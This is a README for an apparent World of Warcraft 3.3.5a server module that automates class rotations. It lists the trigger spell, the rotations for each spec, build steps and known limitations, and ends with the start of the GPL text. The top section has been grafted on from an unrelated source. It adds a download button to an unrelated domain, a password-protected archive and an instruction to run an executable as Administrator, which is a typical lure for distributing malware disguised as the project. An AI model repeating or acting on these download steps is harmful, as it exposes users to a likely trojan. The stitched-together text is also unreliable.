<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Testing status

⚠️ **Only a few classes have been tested at high level** so far (notably Fury
Warrior). All other specializations are implemented from the Wowhead guides
but have not been battle-tested yet — bug reports and fixes are very welcome
(see Contributing below).

## Contributing

**Please submit any modification of this module as a pull request to this
repository**, so that fixes and improvements benefit everyone instead of
diverging across private forks.

Note: this is the project's contribution policy, not a license term — the
GPL-2.0 license legally permits forks and modified copies (source disclosure
is only required when distributing binaries). A pull request here is simply
the friendly way to share improvements with the community.

## The trigger spell

Default: **47322 "Dragonblight Test Spell 02"**, an unused Blizzard test spell
present in the 3.3.5a client `Spell.dbc`: instant, no cost, no cooldown, no
GCD, a single harmless *Dummy* effect. Every player learns it on login
(`Rotation.AutoLearn = 1`).

Renaming it to "Rotation" (and changing its icon) is done client-side with a
small MPQ patch: edit the name of spell 47322 in `DBFilesClient\Spell.dbc`
(WDBX Editor, stoneharry's Spell Editor…) and ship the file in a
`patch-4.MPQ` / `patch-enUS-4.MPQ`. Purely cosmetic: the module works without
it. The spell ID can be changed in the config (`Rotation.SpellId`) without
recompiling.

## Implemented rotations

General rules: power costs (mana/rage/energy/runes), cooldowns, GCD and range
are checked before every cast — if an ability is unavailable, the next one in
the list is tried. "AoE" = at least `Rotation.AoE.Threshold` enemies in combat
within `Rotation.AoE.Radius` yards **of your current target** (default: 2
enemies within 10 yards) — counting around the target rather than around
yourself is what makes AoE work for ranged specs and for non-tank group
members. Healers heal the **selected friendly target** (or
themselves) according to the `Rotation.Heal.*` thresholds, and deal light
damage when nobody is injured.

### Warrior
- **Arms**: Rend → Execute (Sudden Death proc or <20%) → Overpower (Taste for Blood proc) → [AoE: Sweeping Strikes, Bladestorm] → Mortal Strike → Slam → Heroic Strike/Cleave (rage above threshold)
- **Fury**: Bloodthirst → Whirlwind (AoE) → Slam (Bloodsurge proc) → Rend → Execute (<20%) → Heroic Strike/Cleave
- **Protection**: Shield Block → Shield Slam → Revenge → Shockwave → [AoE: Thunder Clap] → Devastate → Heroic Strike/Cleave

### Paladin
- **Retribution**: seal maintained (Vengeance/Corruption by faction); Hammer of Wrath (<20%) → Crusader Strike → Judgement → Divine Storm → Consecration → Exorcism → Holy Wrath (undead/demons). AoE: Consecration and Divine Storm first.
- **Protection**: 969 rotation — Holy Shield maintained → Hammer of the Righteous → Shield of Righteousness → Consecration → Judgement
- **Holy**: Beacon of Light + Sacred Shield maintained → Holy Shock / Flash of Light / Holy Light by severity

### Death Knight
Diseases maintained (Frost Fever + Blood Plague) for all three trees,
[AoE: Death and Decay, Pestilence, Blood Boil], then:
- **Blood**: Death Strike → Heart Strike/Blood Strike → Rune Strike / Death Coil
- **Frost**: Howling Blast (Rime proc) → Obliterate → Blood Strike → Frost Strike
- **Unholy**: Scourge Strike → Blood Strike → Death Coil

### Hunter
Hunter's Mark, Auto Shot and pet engaged automatically; Raptor Strike when the
enemy is in melee. Kill Command → Kill Shot (<20%) → [AoE: Volley,
Multi-Shot] → Serpent Sting → spec shot (**BM**: —, **Marksmanship**: Chimera
Shot then Aimed Shot, **Survival**: Explosive Shot then Black Arrow) → Arcane
Shot → Steady Shot

### Rogue
Slice and Dice maintained from 1 combo point; [AoE: Fan of Knives]; then:
- **Assassination**: Hunger for Blood (with a bleed up) → Envenom (4-5 cp) → Mutilate
- **Combat**: Rupture (4-5 cp) → Eviscerate (5 cp) → Sinister Strike
- **Subtlety**: Rupture (4-5 cp) → Eviscerate (5 cp) → Hemorrhage

### Priest
- **Shadow**: Shadowform → [AoE: Mind Sear] → Vampiric Touch → Devouring Plague → Shadow Word: Pain → Mind Blast → Shadow Word: Death → Mind Flay
- **Discipline**: Power Word: Shield (no Weakened Soul) → Penance → Prayer of Mending → Renew → Flash Heal
- **Holy**: Circle of Healing / Prayer of Mending / Renew / Flash Heal / Greater Heal by severity

### Shaman
- **Elemental**: Water Shield → Flame Shock → Lava Burst → [AoE: Chain Lightning] → Lightning Bolt
- **Enhancement**: Lightning Shield → Lightning Bolt/Chain Lightning (5 Maelstrom Weapon stacks) → Stormstrike → Flame Shock → Earth Shock → Lava Lash
- **Restoration**: Water Shield + Earth Shield → Riptide / Lesser Healing Wave / Chain Heal / Healing Wave by severity

### Mage
- **Arcane**: [AoE: Arcane Explosion, Blizzard] → Arcane Missiles (Missile Barrage proc or 4 Arcane Blast stacks) → Arcane Blast
- **Fire**: Pyroblast (Hot Streak proc) → [AoE: Flamestrike] → Living Bomb → Fireball
- **Frost**: Water Elemental → [AoE: Blizzard] → Deep Freeze / Ice Lance (Fingers of Frost proc) → Frostfire Bolt (Brain Freeze proc) → Frostbolt

### Warlock
Life Tap when mana < 20%; pet engaged; [AoE: Seed of Corruption]; then:
- **Affliction**: Haunt → Corruption → Unstable Affliction → Curse of Agony → Drain Soul (<25%) → Shadow Bolt
- **Demonology**: Curse of Doom → Corruption → Immolate → Soul Fire (Decimation proc) → Incinerate (Molten Core proc) → Shadow Bolt
- **Destruction**: Immolate → Conflagrate → Chaos Bolt → Curse of Doom → Incinerate

### Druid
- **Balance**: Moonkin Form → Faerie Fire → Insect Swarm → Moonfire → [AoE: Starfall, Hurricane] → Starfire (Lunar Eclipse) / Wrath
- **Feral**: follows your current form. **Bear** (tank): Mangle → Faerie Fire (Feral) → Lacerate x5 → [AoE: Swipe] → Maul. **Cat**: Tiger's Fury (low energy) → Savage Roar → Rip (5 cp) → Rake → Mangle → Shred (fallback Mangle/Claw)
- **Restoration**: Rejuvenation / Wild Growth / Regrowth / Swiftmend / Nourish by severity

## Installation

1. Copy the `mod-rotation` folder into the server sources' `modules/`
   directory (next to `mod-playerbots`).
2. Re-run CMake, then rebuild.
3. (Optional) Customize `configs/modules/mod_rotation.conf`; reloadable
   in-game with `.reload config`.

No SQL required.

## Known limitations

- Totems (Shaman), long-duration buffs (Fortitude, Power Word…) and major
  offensive cooldowns (Recklessness, Metamorphosis, Avenging Wrath…) are not
  automated — by design, these decisions are left to the player.
- Positional/tool-dependent abilities (Shred behind the target, Mutilate with
  two daggers, Envenom with a poison up…) fail silently when their
  requirement is not met; a fallback is always tried.
- Ground-targeted spells (Blizzard, Volley, Death and Decay…) are centered on
  the target.


---

                    GNU GENERAL PUBLIC LICENSE
                       Version 2, June 1991

 Copyright (C) 1989, 1991 Free Software Foundation, Inc.,
